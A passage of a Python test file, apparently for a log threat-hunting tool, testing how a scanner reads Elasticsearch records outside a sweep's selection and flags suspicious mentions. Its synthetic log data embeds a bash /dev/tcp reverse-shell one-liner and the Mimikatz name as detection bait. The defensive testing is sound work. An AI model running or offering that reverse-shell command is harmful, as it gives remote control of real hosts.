    (field, value), = body.items()
    actual = _value(source, field)
    if kind == "term":
        return actual == value
    if kind == "terms":
        return actual in value
    if kind == "exists":
        return _value(source, value) is not None
    if kind == "prefix":
        return isinstance(actual, str) and actual.startswith(value["value"])
    raise AssertionError(f"query shape not supported by the test evaluator: {kind}")


class QueryES:
    """Answers histogram, composite, point-in-time and search_after requests from a list of records, honouring each
    query (filters, should, must_not), so the sweep and the residue pass read what a cluster would give them."""

    def __init__(self, hits):
        self.hits = hits
        self.searches: list[dict] = []

    def _matching(self, body):
        query = body.get("query") or {"match_all": {}}
        return [hit for hit in self.hits if matches(query, hit["_source"])]

    def __call__(self, request):
        from urllib.parse import urlparse

        import httpx
        path = urlparse(str(request.url)).path
        body = json.loads(request.content) if request.content else {}
        if request.method == "GET" and path == "/":
            return httpx.Response(200, json={"version": {"number": "8.15.0"}})
        if path.endswith("/_pit") and request.method == "POST":
            return httpx.Response(200, json={"id": "pit-1"})
        if path == "/_pit" and request.method == "DELETE":
            return httpx.Response(200, json={"succeeded": True})
        self.searches.append(body)
        found = self._matching(body)
        total = {"value": len(found), "relation": "eq"}
        shell = {"timed_out": False, "_shards": {"total": 1, "successful": 1, "failed": 0}, "hits": {"total": total,
                                                                                                    "hits": []}}
        if "h" in body.get("aggs", {}):
            shell["aggregations"] = {"h": {"buckets": [{"key_as_string": WINDOW.start.isoformat(),
                                                         "key": int(WINDOW.start.timestamp() * 1000),
                                                         "doc_count": len(found)}]}}
            return httpx.Response(200, json=shell)
        if "g" in body.get("aggs", {}):
            (name, source), = body["aggs"]["g"]["composite"]["sources"][0].items()
            field = source["terms"]["field"]
            counts: dict = {}
            for hit in found:
                key = _value(hit["_source"], field)
                counts[key] = counts.get(key, 0) + 1
            shell["aggregations"] = {"g": {"buckets": [{"key": {name: key}, "doc_count": count}
                                                       for key, count in counts.items()]}}
            return httpx.Response(200, json=shell)
        start = int(body["search_after"][1]) + 1 if "search_after" in body else 0
        size = body.get("size", 1000)
        page = [{**hit, "sort": [int(T0.timestamp() * 1000), start + n]}
                for n, hit in enumerate(found[start:start + size])]
        shell["pit_id"] = "pit-1"
        shell["hits"]["hits"] = page
        return httpx.Response(200, json=shell)


def _client(hits, **settings):
    import httpx

    from romulus.config import Settings
    from romulus.sources.es import ElasticClient
    transport = QueryES(hits)
    return ElasticClient(Settings(es_url="http://es.invalid", mention_dir=FIXTURES, **settings),
                         transport=httpx.MockTransport(transport)), transport


def _pass(tmp_path, hits, contract, filters, any_of=(), **settings):
    from types import SimpleNamespace

    from romulus.hunt.mention_residue import ResiduePass
    client, transport = _client(hits, **settings)
    scanner = _scanner(tmp_path)
    owner = SimpleNamespace(contracts={contract.target: contract}, mentions=scanner, client=client, window=WINDOW,
                            heartbeat=lambda: None, stop_check=None)
    ResiduePass(owner, contract.target, list(filters), [list(group) for group in any_of]).run()
    return scanner, transport


def test_a_windows_record_outside_a_network_targets_selection_is_read_and_scanned(tmp_path):
    from romulus.sources.models import Predicate
    network = contract_from_types("net-x", {"@timestamp": "date", "event.dataset": "keyword",
                                            "message": "text"}, role="network")
    zeek = {"_index": "net-x", "_id": "z1", "_source": {"@timestamp": T0.isoformat(), "event": {
        "dataset": "zeek.conn"}, "message": "MIMIKATZ in a selected record is the sweep's, not the residue's"}}
    windows = {"_index": "net-x", "_id": "w1", "_source": {
        "@timestamp": T0.isoformat(), "agent": {"type": "winlogbeat"}, "host": {"name": "dc1"},
        "event": {"dataset": "windows.security"},
        "winlog": {"channel": "Security", "event_id": 4688, "computer_name": "dc1", "record_id": 3},
        "message": "A new process has been created: m.exe MIMIKATZ"}}
    scanner, transport = _pass(tmp_path, [zeek, windows], network,
                               [Predicate(field="event.dataset", op="in", value=["zeek.conn"])])
    rows = list(scanner.ranked())
    assert [(scanner.patterns.patterns[row[1]].id, row[2], row[6]) for row in rows] == [
        ("mention.test_mimikatz", "dc1", "windows_text")]
    assert "outside the sweep's selection" in json.loads(rows[0][7])["query"]
    summary = scanner.summary()
    assert summary["outside_selection"]["targets"]["net-x"] == {
        "records": 1, "read": 1, "counted": True, "reason": "", "drift": "", "keys_not_read_in_full": 0,
        "keys": []}
    assert summary["status"] == SCANNED_ALL
    # every residue request negates the sweep's selection exactly
    assert all(body["query"]["bool"]["must_not"] for body in transport.searches)
    scanner.close()


def test_a_selection_that_reads_everything_has_no_residue_and_none_is_fetched(tmp_path):
    scanner, transport = _pass(tmp_path, [_record(1, {"message": "MIMIKATZ"})], CONTRACT, [])
    assert transport.searches == [] and scanner.summary()["outside_selection"]["targets"][TARGET]["records"] == 0
    scanner.close()


def test_past_the_budget_small_datasets_are_read_whole_and_the_rest_share_it(tmp_path):
    from romulus.hunt.mention_residue import allocate
    from romulus.sources.models import Predicate
    assert allocate([2, 100, 50], 30) == [2, 14, 14] and allocate([5, 5], 100) == [5, 5]
    assert allocate([3, 3, 3], 2) == [0, 1, 1]
    selected = _record(0, {"event": {"dataset": "linux.audit"}, "message": "x"})
    small = [_record(n, {"event": {"dataset": "small.app"}, "message": f"MIMIKATZ {n}"}, host="h-small")
             for n in range(1, 3)]
    big = [_record(n, {"event": {"dataset": "big.app"}, "message": f"line {n}"}, host="h-big")
           for n in range(10, 60)]
    scanner, _transport = _pass(tmp_path, [selected, *small, *big], CONTRACT,
                                [Predicate(field="event.dataset", op="in", value=["linux.audit"])],
                                mention_residue_records=12)
    row = scanner.summary()["outside_selection"]["targets"][TARGET]
    assert (row["records"], row["read"], row["keys_not_read_in_full"]) == (52, 12, 1)
    assert row["keys"] == [{"key": "big.app", "key_field": "event.dataset", "records": 50, "read": 10,
                            "not_read": 40}]
    # the small dataset was read whole: its mention is there
    assert {row[2] for row in scanner.ranked()} == {"h-small"}
    summary = scanner.summary()
    assert summary["status"] == "partial"
    assert any(reason.startswith(f"{TARGET}: 40 of 52 record(s) outside the sweep's selection were not scanned")
               and "big.app (40 of 50)" in reason for reason in summary["reasons"])
    scanner.close()


def _sweep(tmp_path, hits, contract, **settings):
    from romulus.hunt.sweep import Sweep
    from tests.test_mention_sweep import _repo
    client, transport = _client(hits, **settings)
    repo = _repo(tmp_path / "hunt.sqlite")
    sweep = Sweep(repo, client, "h1", WINDOW, {contract.target: contract}, stage_dir=tmp_path / "stage")
    sweep.run_target(contract.target)
    sweep.mention_residue(contract.target)
    sweep.finalize()
    return repo, sweep, transport


SSHD = {"event": {"dataset": "system.auth"}, "process": {"name": "sshd", "pid": 4},
        "message": "Accepted password for root from 198.51.100.4 port 51515 ssh2"}
# a target that cannot search event.module or input.type: the Auditbeat and journald-input shapes cannot be selected
NARROW = contract_from_types(TARGET, {"@timestamp": "date", "event.dataset": "keyword", "host.name": "keyword",
                                      "message": "text"})


def test_shapes_a_target_cannot_select_are_no_gap_when_nothing_is_outside_the_selection(tmp_path):
    hits = [_record(1, SSHD), _record(2, {"event": {"dataset": "custom.app"}, "message": f"x {SHELL}"})]
    repo, sweep, _transport = _sweep(tmp_path, hits, NARROW)
    stored = repo.mention_scan("h1")
    # the sweep still lists the shapes for detection coverage; the pool counted the records outside its selection
    # exactly (none), so they are not a mention gap
    assert sweep.stats.get("linux_shapes_not_assessed", {}).get(TARGET)
    assert stored["left_out_sources"] == [] and stored["outside_selection"]["targets"][TARGET]["records"] == 0
    assert stored["status"] == SCANNED_ALL, stored["reasons"]
    assert [row["pattern_id"] for row in repo.mentions("h1")] == ["mention.test_dev_tcp_redirect"]


def test_a_record_of_a_shape_the_target_cannot_select_is_read_and_scanned(tmp_path):
    journald_input = {"input": {"type": "journald"}, "process": {"command_line": SHELL, "name": "bash"},
                      "message": "session opened"}
    hits = [_record(1, SSHD), _record(2, journald_input, host="db1")]
    repo, _sweep_run, _transport = _sweep(tmp_path, hits, NARROW)
    stored = repo.mention_scan("h1")
    assert stored["outside_selection"]["targets"][TARGET] == {
        "records": 1, "read": 1, "counted": True, "reason": "", "drift": "", "keys_not_read_in_full": 0,
        "keys": []}
    rows = repo.mentions("h1")
    assert [(row["pattern_id"], row["host"]) for row in rows] == [("mention.test_dev_tcp_redirect", "db1")]
    assert stored["status"] == SCANNED_ALL, stored["reasons"]
    # a mention is never a finding, whatever it read
    assert repo.candidates("h1") == [] or all(row["lane"] != "mention" for row in repo.candidates("h1"))


# ---- volume: every family, streamed, bounded memory, exact counts ---------------------------------------------------

def _family_records(count: int, start: int = 0):
    """Synthetic records of every family, made on the fly; one in 500 holds a pattern in a non-message field."""
    import random
    rng = random.Random(7)
    words = ["session", "opened", "unit", "started", "cron", "eth0", "link", "ok", "pid=41", "uid=0", "lease"]
    for n in range(start, start + count):
        bad = n % 500 == 0
        text = (f"bash -i >& /dev/tcp/10.0.{n % 256}.{n % 199}/4444 0>&1" if bad
                else " ".join(rng.choice(words) for _ in range(rng.randint(4, 12))) + f" {n % 9973}")
        kind = n % 5
        if kind == 0:
            source = {"message": f"type=PROCTITLE msg=audit(1731938400.{n % 1000:03d}:{n}): proctitle={_hex(text)}"}
        elif kind == 1:
            source = {"event": {"original": json.dumps({"MESSAGE": "started", "_CMDLINE": text, "_PID": str(n)})}}
        elif kind == 2:
            source = {"event": {"original": json.dumps({"event_type": "http", "src_ip": "10.0.0.1", "flow_id": n,
                                                        "http": {"url": "/" + text, "hostname": "x.example"}})}}
        elif kind == 3:
            source = {"event": {"original": json.dumps({"@timestamp": "t", "process": {"command_line": text}})}}
        else:
            source = {"message": "process started", "process": {"command_line": text}}
        yield {"_index": TARGET, "_id": f"v{n}", "_source": {
            "@timestamp": (T0 + timedelta(milliseconds=n % 299_000)).isoformat(),
            "host": {"name": f"host{n % 3000}"}, **source}}


def test_a_streamed_scan_of_every_family_keeps_memory_bounded_and_counts_exactly(tmp_path):
    import os

    from tests.test_mention_sweep import _rss
    count = int(os.environ.get("ROMULUS_MENTION_FAMILY_SCALE") or 100_000)
    scanner = MentionScanner("h1", load_mention_patterns(FIXTURES), stage_dir=tmp_path,
                             window=(WINDOW.start, WINDOW.end), max_per_pattern=2_000, max_per_host=50,
                             max_per_hunt=5_000)
    base, peak, chunk = _rss(), 0, []
    for hit in _family_records(count):
        title = "type=PROCTITLE" in str(hit["_source"].get("message", ""))
        chunk.append((hit, "x", False, ("proctitle",)) if title else (hit, "x"))
        if len(chunk) == 5_000:
            scanner.scan(TARGET, CONTRACT, chunk, None)
            chunk = []
            peak = max(peak, _rss() - base)
    scanner.scan(TARGET, CONTRACT, chunk, None)
    summary = scanner.summary()
    scanner.close()
    assert summary["records_scanned"] == count and summary["lines_matched"] == count // 500
    # two texts for the journal (MESSAGE, _CMDLINE), EVE (url, hostname) and message-with-command-line records
    assert summary["lines_scanned"] == count + 3 * (count // 5)
    assert set(summary["by_field"]) == {"auditd:PROCTITLE.proctitle", "journald:event.original#journal:MESSAGE",
                                        "journald:event.original#journal:_CMDLINE",
                                        "suricata_eve:event.original#eve:http.hostname",
                                        "suricata_eve:event.original#eve:http.url",
                                        "ecs_json:event.original#process.command_line", "text:message",
                                        "text:process.command_line"}
    assert summary["groups_kept"] <= 5_000 and peak < 96 * 2**20, peak


class _PagedClient:
    """A source of `total` records outside the selection, answered page by page as a point-in-time read would."""

    def __init__(self, total: int):
        from types import SimpleNamespace
        self.total = total
        self.settings = SimpleNamespace(es_flavor="elasticsearch", mention_residue_records=0)
        self.version = "8.15.0"
        self.read = 0

    def run(self, q):
        from romulus.sources.models import Completeness, SearchOutcome
        now = datetime.now(UTC)
        return SearchOutcome(target=q.target, fingerprint=q.fingerprint, started_at=now, ended_at=now,
                             completeness=Completeness.complete, total=self.total, total_relation="eq"), {}

    def search(self, _target, _body):
        # a count by dataset that does not add up: the budget is then spent on the earliest records
        return {"hits": {"total": {"value": self.total, "relation": "eq"}}, "aggregations": {"g": {"buckets": []}}}

    def iterate(self, q, max_records):
        for start in range(0, min(self.total, max_records), 1_000):
            page = [{"_id": hit["_id"], "_index": hit["_index"], "_source": hit["_source"]}
                    for hit in _family_records(min(1_000, max_records - start), start)]
            self.read += len(page)
            yield page, {"problems": [], "total": self.total, "total_relation": "eq"}


def test_the_records_outside_the_selection_are_streamed_within_the_budget(tmp_path):
    from types import SimpleNamespace

    from romulus.hunt.mention_residue import ResiduePass
    from romulus.sources.models import Predicate
    from tests.test_mention_sweep import _rss
    client = _PagedClient(60_000)
    client.settings.mention_residue_records = 50_000
    scanner = _scanner(tmp_path)
    owner = SimpleNamespace(contracts={TARGET: CONTRACT}, mentions=scanner, client=client, window=WINDOW,
                            heartbeat=lambda: None, stop_check=None)
    base = _rss()
    ResiduePass(owner, TARGET, [Predicate(field="event.dataset", op="in", value=["linux.audit"])], []).run()
    grown = _rss() - base
    summary = scanner.summary()
    row = summary["outside_selection"]["targets"][TARGET]
    # no exactly searchable key here (the composite answer is not given): the earliest records by time were read
    assert client.read == 50_000 and (row["records"], row["read"]) == (60_000, 50_000)
    assert summary["outside_selection"]["offered"] == 50_000 and summary["status"] == "partial"
    assert any("10,000 of 60,000 record(s) outside the sweep's selection were not scanned" in reason
               for reason in summary["reasons"])
    assert grown < 96 * 2**20, grown
    scanner.close()


def test_a_budget_past_the_source_layers_record_bound_still_reads(tmp_path):
    from types import SimpleNamespace

    from romulus.hunt.mention_residue import INTENT_MAX_RECORDS, ResiduePass
    from romulus.sources.models import Predicate
    client = _PagedClient(5_000)
    client.settings.mention_residue_records = INTENT_MAX_RECORDS + 1_000_000
    scanner = _scanner(tmp_path)
    owner = SimpleNamespace(contracts={TARGET: CONTRACT}, mentions=scanner, client=client, window=WINDOW,
                            heartbeat=lambda: None, stop_check=None)
    ResiduePass(owner, TARGET, [Predicate(field="event.dataset", op="in", value=["linux.audit"])], []).run()
    row = scanner.summary()["outside_selection"]["targets"][TARGET]
    assert (row["records"], row["read"], row["reason"]) == (5_000, 5_000, "") and client.read == 5_000
    scanner.close()


class _LateES(QueryES):
    """A record with an early timestamp is indexed after the count (ingest lag)."""

    def __init__(self, hits, late):
        super().__init__(hits)
        self.late = late

    def __call__(self, request):
        response = super().__call__(request)
        body = json.loads(request.content) if request.content else {}
        if "h" in body.get("aggs", {}) and self.late not in self.hits:
            self.hits.insert(0, self.late)
        return response


def _late_pass(tmp_path, budget):
    import httpx

    from romulus.config import Settings
    from romulus.hunt.mention_residue import ResiduePass
    from romulus.sources.es import ElasticClient
    from romulus.sources.models import Predicate
    hits = [_record(n, {"event": {"dataset": "app"}, "message": f"line {n}"}) for n in range(10, 20)]
    late = _record(1, {"event": {"dataset": "app"}, "message": "MIMIKATZ late arrival"}, host="late")
    client = ElasticClient(Settings(es_url="http://es.invalid", mention_dir=FIXTURES, mention_residue_records=budget),
                           transport=httpx.MockTransport(_LateES(hits, late)))
    from types import SimpleNamespace
    scanner = _scanner(tmp_path)
    owner = SimpleNamespace(contracts={TARGET: CONTRACT}, mentions=scanner, client=client, window=WINDOW,
                            heartbeat=lambda: None, stop_check=None)
    ResiduePass(owner, TARGET, [Predicate(field="event.dataset", op="in", value=["linux.audit"])], []).run()
    return scanner


def test_a_record_indexed_after_the_count_is_read_and_the_change_makes_the_pool_partial(tmp_path):
    scanner = _late_pass(tmp_path, 1_000)
    summary = scanner.summary()
    row = summary["outside_selection"]["targets"][TARGET]
    # the read went on to the end of its point in time: the late record was read and scanned
    assert (row["records"], row["read"]) == (11, 11) and {r[2] for r in scanner.ranked()} == {"late"}
    assert "11 when read, 10 when counted" in row["drift"] and summary["status"] == "partial"
    assert any(reason.startswith(f"{TARGET}: the source's records outside the selection changed")
               for reason in summary["reasons"])
    scanner.close()


def test_a_read_that_stops_at_the_budget_before_its_point_in_time_ends_is_partial(tmp_path):
    scanner = _late_pass(tmp_path, 10)
    row = scanner.summary()["outside_selection"]["targets"][TARGET]
    assert (row["records"], row["read"]) == (11, 10) and row["keys"][0]["not_read"] == 1
    assert scanner.summary()["status"] == "partial"
    scanner.close()


def test_a_residue_that_cannot_be_counted_leaves_the_left_out_sources_named(tmp_path):
    from types import SimpleNamespace

    from romulus.hunt.sweep import Sweep
    scanner = _scanner(tmp_path)
    scanner.note_residue("logs-a", records=None, read=0, counted=False, reason="count not exact")
    scanner.note_residue("logs-b", records=0, read=0, counted=True)
    owner = SimpleNamespace(stats={
        "linux_shapes_not_assessed": {"logs-a": ["input.type:journald: not searchable on this target"],
                                      "logs-b": ["input.type:journald: not searchable on this target"]},
        "dataset_reconciliation": {"logs-b": [
            {"dataset": "custom", "records": 4, "reason": "not retrieved by the sweep: no normalizer reads this "
                                                          "dataset, so no rule evaluates it", "count_scope": "x"},
            {"dataset": "linux.audit", "records": 3, "reason": "not retrieved: selected for retrieval, but the "
                                                               "sweep's source query did not return these records",
             "count_scope": "y"}]}}, _windows_selective=set())
    Sweep._mention_left_out(owner, scanner)
    assert sorted((item["target"], item["name"]) for item in scanner.left_out) == [
        ("logs-a", "input.type:journald"), ("logs-b", "linux.audit")]
    summary = scanner.summary()
    assert any(reason.startswith("logs-a: count not exact") for reason in summary["reasons"])
    scanner.close()
